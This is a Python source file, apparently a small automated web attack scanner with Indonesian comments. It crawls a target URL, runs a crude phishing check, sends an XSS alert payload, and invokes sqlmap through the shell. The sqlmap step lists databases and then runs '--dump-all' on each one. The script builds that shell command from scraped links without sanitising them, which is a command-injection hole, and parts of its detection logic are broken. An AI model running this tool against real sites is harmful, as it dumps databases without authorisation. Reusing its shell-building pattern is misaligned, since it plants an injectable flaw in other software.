from bs4 import BeautifulSoup
#import libs
from urllib.parse import *
import urllib.request       # library untuk HTTP request
import urllib.parse         # library untuk memberikan balasan kepada client
from urllib.error import *  # library untuk penanganan Error
import re
import http.client
from datetime import *
import subprocess

class mainInject:

    def __init__(self, url):
        self.url = url
        self.URLSql = []
        self.URLXss = []
        self.URLPhising = []
        self.srcPhising = []
        self.resultPhising = []
        self.log = list()
        self.log_csv = list()

        self.phissing(self.url)

    def phissing(self, url):
        URLAsli = url
        response = urllib.request.urlopen(URLAsli).read()

        # --Proses serangan Phising--
        self.log.append("Result Phising Attack")
        soupPhising = BeautifulSoup(response, 'html5lib')
        kondisiPhising = soupPhising.find_all('a', href=re.compile('login'))
        if len(kondisiPhising) > 0:
            for b in kondisiPhising:
                self.URLPhising.append(b['href'])
        else:
            self.log.append(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " " + URLAsli + "not vulnerability with Phising attack")

        intPhising = 0
        tdkPhising = []
        for phising in self.URLPhising:
            try:
                url = self.URLPhising[intPhising]
                responsePhising = urllib.request.urlopen(url).read()
                soupCopasPhising = BeautifulSoup(responsePhising, 'html5lib')
                kondisicekPhising = soupCopasPhising.find_all('img', {"src": True})
                if len(kondisicekPhising) > 0:
                    letter = ["http"]
                    x = 0
                    for c in kondisicekPhising:
                        self.srcPhising.append(c['src'])
                        first = self.srcPhising[x][:4]
                        if first in letter != -1:
                            self.resultPhising.append("rentan")
                            break
                        else:
                            tdkPhising.append("a")
                        x = x + 1
                if len(self.resultPhising) > 0:
                    kondisiCopasPhising = soupCopasPhising.find_all('html')
                    self.log.append(str(kondisiCopasPhising))
                    self.log.append(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " " + URLAsli + "vulnerability with Phising attack")
                    list = ["-", "Phising", url, "Severe"]
                    self.log_csv.append(list)
                else:
                    self.log.append(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " " + URLAsli + "not vulnerability with Phising attack !")
                intPhising = intPhising + 1

            except (ValueError, URLError) as e:
                self.log.append(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " " + URLAsli + "not vulnerability with Phising attack !")
        # -- Proses Serangan Phising end--

        soup = BeautifulSoup(response, 'html5lib')
        kondisi = soup.find_all('a', href=re.compile('id='))  # mencari tag <a> yang memiliki atribut "href". Kemudian mencari value href yang memiliki kalimat "id=" (Menggunakan regex / regular expression)
        if len(kondisi) > 0:
            y = urlparse(URLAsli)
            URLFix = y.scheme + "://" + y.netloc + y.path  # mengatur URL (menghilangkan query untuk case "atmaine.fi"
            print(URLFix)
            for a in kondisi:
                self.URLSql.append(URLFix + a['href'])
                self.URLXss.append(URLFix + a['href'])

        self.injection(URLAsli)
        self.xss(URLAsli)

    def injection(self, url):
        URLAsli = url
        self.log.append("result SQL Injection")
        intSQL = 0
        tdkSQL = []
        for sql in self.URLSql:
            try:
                apa = []
                command = ('sqlmap -u ' + self.URLSql[0] + ' --dbs' + ' --batch')
                result = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
                cari = str(result.stdout.read())
                self.log.append(cari)
                apa.append(cari.split("\\n[*]"))
                nilai = 2
                for db in apa:
                    database = db[nilai]
                    commandDB = ('sqlmap -u ' + self.URLSql[0] + ' -D ' + database + ' --dump-all' + ' --batch')
                    resultDB = subprocess.Popen(commandDB, stdout=subprocess.PIPE, shell=True)
                    self.log.append(str(resultDB.stdout.read(25373)))
                    nilai += 1
                tdkSQL.append("a")
                break
            except HTTPError as e:
                print(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " " + self.URLSql[intSQL], ":", e.code, e.reason)
                self.log.append(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " " + self.URLSql[intSQL] + ":" + e.code + e.reason)
                intSQL = intSQL + 1
            except http.client.IncompleteRead as e:
                responseSQL = e.partial
        if len(tdkSQL) == 0:
            print(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " " + URLAsli, "not vulnerability with SQL Injection")
            self.log.append(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " " + URLAsli + " not vulnerability with SQL Injection")
        else:
            list = ["A1", "SQL Injection", URLAsli, "Severe"]
            self.log_csv.append(list)

        # --Proses serangan SQL Injection end--

    def xss(self, url):
        URLAsli = url
        self.log.append("Result XSS Attack")
        intXSS = 0
        tdkXSS = []
        for xss in self.URLXss:
            try:
                responseXSS = urllib.request.urlopen(self.URLXss[intXSS] + "%22%3E%3Cscript%3Ealert%28222%29%3C%2Fscript%3E").read()
                soupXSS = BeautifulSoup(responseXSS, 'html5lib')
                kondisiXSS = soupXSS.find_all('script', string=re.compile('alert'))
                if len(kondisiXSS) > 0:
                    self.log.append(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " " + self.URLXss[intXSS] + " vulnerability with Cross-Site Scripting")
                    tdkXSS.append("tidak")
                intXSS = intXSS + 1
            except HTTPError as e:
                self.log.append(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " " + str(self.URLXss[intXSS]) + ":" + str(e.code) + str(e.reason))
                intXSS = intXSS + 1
            except http.client.IncompleteRead as e:
                responseSQL = e.partial
        if len(tdkXSS) == 0:
            self.log.append(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " " + URLAsli + " not vulnerability with Cross-Site Scripting")
        else:
            list = ["A3", "XSS", URLAsli, "Moderate"]
            self.log_csv.append(list)
            # Proses serangan XSS end--
        # self.textArea.insertPlainText("Complete !!")
        print("complete")

    def return_output(self):
        output = self.log
        return output

    def return_output_csv(self):
        output = self.log_csv
        return output
